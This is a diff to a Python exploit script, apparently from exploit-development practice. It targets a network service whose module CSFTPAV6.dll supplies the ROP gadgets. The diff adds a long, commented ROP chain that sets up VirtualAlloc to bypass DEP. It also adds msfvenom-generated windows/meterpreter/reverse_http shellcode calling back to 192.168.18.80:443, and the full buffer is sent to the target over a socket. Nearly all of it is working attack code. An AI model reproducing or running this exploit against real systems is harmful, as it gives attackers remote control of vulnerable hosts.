@@ -58,6 +58,8 @@ from struct import pack
 from colorama import Fore, Style, init
 from numpy import byte
 
+from modules.msfvenom_module import generatePayload
+
 init()
 
 # Checksum
@@ -85,19 +87,114 @@ VirtualAlloc += pack("<L", (0x49494949))  # Dummy flAllocationType
 VirtualAlloc += pack("<L", (0x51515151))  # Dummy flProtect
 
 offset = b"A" * (276 - len(VirtualAlloc))
-eip = pack("<L", (0x50501110))  # CSFTPAV6.dll -> PUSH ESP; PUSH EAX; POP EDI; POP ESI; RET. This got me into the stack for exec
-rop = pack("<L", (0x5050118E))  #                 MOV EAX, ESI; POP ESI; RETN
-rop += pack("<L", (0x42424242))  # junk, added for alignment
-rop += pack("<L", (0x505115a3))  #             -> POP ECX, RET;
-rop += pack("<L", (0xffffffe4))  # -0x1c
-rop += pack("<L", (0x5051579a))  #             -> ADD EAX, ECX; RET
-  
+eip = pack("<L", (0x50501110))  # CSFTPAV6.dll -> PUSH ESP; PUSH EAX; POP EDI; POP ESI; RET | This got me into the stack for exec
 
+# NOTE:: POP requires the value to loaded in  the next 4 bytes to work
+# For example, to load ECX with -1
+# 0xFFFFFFFF must be the next value right after our POP ECX instruction as the POP instruction increments ESI by 4
 
-rop += b"C" * (0x400 - 276 - 4 - len(rop))
+# VirtualAlloc(lpVoid lpAddress, size_t dwSize, dword flAllocationType, dword flProtect)
+# lpAddress = shellcode addr
+# dwSize = 0x1
+# flAllocationType = 0x1000 (MEM_COMMIT)
+# flProtect = 0x40 (PAGE_EXECUTE_READWRITE)
 
+# ROP Chain to write VirtualAlloc IAT address into ESI
+rop = pack("<L", (0x5050118E))  #             MOV EAX, ESI; POP ESI; RETN | Store VirtualAlloc IAT(VA_IAT) into EAX
+rop += pack("<L", (0x42424242))  # junk, added for alignment | Filler for POP ESI
+rop += pack("<L", (0x505115A3))  #      -> POP ECX, RET; | Load offset into ECX
+rop += pack("<L", (0xFFFFFFE4))  # -0x1c | Load ECX with -28
+rop += pack("<L", (0x5051579A))  #      -> ADD EAX, ECX; RET | Adjust EAX by subtracting ECX
+rop += pack("<L", (0x50537D5B))  #      -> PUSH EAX; POP ESI; RET | Store VirtualAlloc IAT into ESI
+rop += pack("<L", (0x5053A0F5))  #      -> POP EAX; RET | Prepare to load VA_IAT + 1
+rop += pack("<L", (0x5054A221))  #      -> VirtualAlloc IAT + 1 | Store Manually incremented VA_IAT on stack
+rop += pack("<L", (0x505115A3))  #      -> POP ECX; RET | Load -1 into ECX
+rop += pack("<L", (0xFFFFFFFF))  #      -> mov -1 into ecx | Store -1 on stack for prevInstrcution
+rop += pack("<L", (0x5051579A))  #      -> ADD EAX, ECX; RET | Add -1 to EAX, gets true VA_IAT
+rop += pack("<L", (0x5051F278))  #      -> MOV EAX, dw [EAX]; RET | store dereferenced VA_IAT (VirtualAlloc Addr) into EAX
+rop += pack("<L", (0x5051CBB6))  #      -> MOV dw [ESI], EAX; RET | store VirtualAlloc Addr into ESI (overwrite IAT)
 
-buffer = offset + VirtualAlloc + eip + rop
+# writing return address for VirtualAlloc
+rop += pack("<L", (0x50522FA7))  #      -> INC ESI, add al, 2B; RET | increment ESI
+rop += pack("<L", (0x50522FA7))  #      -> INC ESI, add al, 2B; RET | increment ESI
+rop += pack("<L", (0x50522FA7))  #      -> INC ESI, add al, 2B; RET | increment ESI
+rop += pack("<L", (0x50522FA7))  #      -> INC ESI, add al, 2B; RET | increment ESI
+rop += pack("<L", (0x5050118E))  #      -> MOV EAX, ESI ; POP ESI ; RET | Save ESI in EAX, then POP stack into ESI
+rop += pack("<L", (0x42424242))  # junk, added for alignment | Filler for POP ESI
+rop += pack("<L", (0x5052F773))  #      -> PUSH EAX; POP ESI; RET | Stock into EAX, pop next 4 bytes into ESI
+rop += pack("<L", (0x505115A3))  #      -> POP ECX; RET | Load -0x210 into ECX
+rop += pack("<L", (0xFFFFFDF0))  # -0x210 | Load ECX with -0x210
+rop += pack("<L", (0x50533BF4))  #      -> SUB EAX, ECX; RET | Small dummy positive offset to EAX, will point to shellcode
+rop += pack("<L", (0x5051CBB6))  #      -> MOV dw [ESI], EAX; RET | overwrite dummy shellcode with real shellcode address
+
+# fetching & writing lpAddress (shellcode addr) to ESI
+# bp 0x5051CBB6
+rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
+rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
+rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
+rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
+rop += pack("<L", (0x5050118E))  # mov eax, esi ; pop esi ; ret
+rop += pack("<L", (0x42424242))  # junk
+rop += pack("<L", (0x5052F773))  # push eax ; pop esi ; ret
+rop += pack("<L", (0x505115A3))  # pop ecx ; ret
+rop += pack("<L", (0xFFFFFDF4))  # -0x20c
+rop += pack("<L", (0x50533BF4))  # sub eax, ecx ; ret
+rop += pack("<L", (0x5051CBB6))  # mov dword [esi], eax ; ret
+
+# fetching & writing dwSize (0x1) to ESI
+# bp 0x5051CBB6
+rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
+rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
+rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
+rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
+rop += pack("<L", (0x5053A0F5))  # pop eax ; ret
+rop += pack("<L", (0xFFFFFFFF))  # -1 value that is negated
+rop += pack("<L", (0x50527840))  # neg eax ; ret
+rop += pack("<L", (0x5051CBB6))  # mov dword [esi], eax ; ret
+
+# fetching & writing flAllocationType (0x1000) to ESI
+# bp 0x5051579a ".if (@eax & 0x0`ffffffff) = 0x80808080 {} .else {gc}"
+rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
+rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
+rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
+rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
+rop += pack("<L", (0x5053A0F5))  # pop eax ; ret
+rop += pack("<L", (0x80808080))  # first value to be added
+rop += pack("<L", (0x505115A3))  # pop ecx ; ret
+rop += pack("<L", (0x7F7F8F80))  # second value to be added
+rop += pack("<L", (0x5051579A))  # add eax, ecx ; ret
+rop += pack("<L", (0x5051CBB6))  # mov dword [esi], eax ; ret
+
+# fetching & writing flProtect (0x40) to ESI
+rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
+rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
+rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
+rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
+rop += pack("<L", (0x5053A0F5))  # pop eax ; ret
+rop += pack("<L", (0x80808080))  # first value to be added
+rop += pack("<L", (0x505115A3))  # pop ecx ; ret
+rop += pack("<L", (0x7F7F7FC0))  # second value to be added
+rop += pack("<L", (0x5051579A))  # add eax, ecx ; ret
+rop += pack("<L", (0x5051CBB6))  # mov dword [esi], eax ; ret
+# rop += pack("<L", (0x5051E4DB))  # int3 ; push eax ; call esi
+
+# Align stack for VirtualAlloc Exec
+# bp 0x5050118e ".if @eax = 0x40 {} .else {gc}"
+rop += pack("<L", (0x5050118E))  # mov eax, esi; pop esi; ret
+rop += pack("<L", (0x42424242))  # junk, added for alignment | Filler for POP ESI
+rop += pack("<L", (0x505115A3))  # pop ecx; ret
+rop += pack("<L", (0xFFFFFFE8))  # -0x18 | Load ECX with -0x18
+rop += pack("<L", (0x5051579A))  # add eax, ecx; ret | Adjust EAX to point to start of shellcode
+rop += pack("<L", (0x5051571F))  # xchg eax, ebp; ret | Set EBP to point to start of shellcode, which will be used as stack for VirtualAlloc
+rop += pack("<L", (0x50533CBF))  # mov esp, ebp; pop ebp; ret | Set ESP to point to start of shellcode, prepare for VirtualAlloc call
+
+# Calculated padding to align with return address
+padding = b"C" * 0xE0
+
+# increased from 0x400 to 0x600 when using msfvenom
+shellcode = generatePayload(payload="windows/meterpreter/reverse_http", LHOST="192.168.18.80", LPORT=443, bad_chars="\x00\x09\x0a\x0b\x0c\x0d\x20")
+
+buffer = offset + VirtualAlloc + eip + rop + padding + shellcode
 
 buf += b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (buffer, 0, 0, 0, 0)
 buf = pack(">i", len(buf) - 4) + buf  # Checksum DWORD        0x00 - 0x04
@@ -119,10 +216,7 @@ def printBuffer(buf, width="db"):
     bytes_per_line = groups_per_line * w
     for i in range(0, len(buf), bytes_per_line):
         print(
-            Fore.YELLOW
-            + f"\t"
-            + f"{i:04x} - {min(i+bytes_per_line, len(buf)):04x}: "
-            + Style.RESET_ALL,
+            Fore.YELLOW + f"\t" + f"{i:04x} - {min(i+bytes_per_line, len(buf)):04x}: " + Style.RESET_ALL,
             end="",
         )
         for g in range(groups_per_line):
@@ -157,15 +251,19 @@ def main():
 
     print(Fore.CYAN + f"o IP Addr: {server}:{port}" + Style.RESET_ALL)
 
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((server, port))
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((server, port))
 
-    print(Fore.CYAN + f"o Sending Buffer ({len(buf)} bytes): " + Style.RESET_ALL)
-    printBuffer(buf, width="dd")
-    s.send(buf)
-    s.close()
+        print(Fore.CYAN + f"o Sending Buffer ({len(buf)} bytes): " + Style.RESET_ALL)
+        printBuffer(buf, width="dd")
+        s.send(buf)
+        s.close()
 
-    sys.exit(0)
+        sys.exit(0)
+    except KeyboardInterrupt:
+        print(Fore.RED + "\n[!] User requested shutdown" + Style.RESET_ALL)
+        sys.exit(1)
 
 
 if __name__ == "__main__":
